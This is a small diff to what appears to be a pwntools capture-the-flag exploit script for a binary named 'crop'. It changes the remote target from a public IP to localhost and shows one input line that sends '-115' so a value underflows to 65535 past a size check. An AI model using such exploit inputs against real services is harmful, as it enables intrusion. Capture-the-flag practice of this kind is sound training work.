@@ -12,7 +12,7 @@ context.arch = "amd64"
 DEBUG = 0
 
 elf = ELF("../file/crop")
-io = process("../file/crop") if DEBUG else remote("101.34.90.86", 20002)
+io = process("../file/crop") if DEBUG else remote("127.0.0.1", 20002)
 
 
 io.sendlineafter("114", "-115") # 让b成为-1，uint16下的-1是65535，大于514
